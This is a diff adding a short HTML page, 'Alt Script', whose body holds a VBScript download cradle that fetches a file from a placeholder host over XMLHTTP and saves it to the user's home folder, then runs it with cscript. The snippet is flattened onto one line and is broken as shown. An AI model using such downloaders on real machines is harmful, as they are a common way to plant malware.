@@ -1,0 +1,9 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Alt Script</title>
+</head><body>Set args = Wscript.Arguments Url = "http://domain/file" dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", Url, False xHttp.Send with bStrm &nbsp; &nbsp; .type = 1 ' &nbsp; &nbsp; .open &nbsp; &nbsp; .write xHttp.responseBody &nbsp; &nbsp; .savetofile " C:%homepath%file", 2 ' end with<br/>
+<br/>
+<br/>
+C:&gt;cscript test.vbs</body></html>
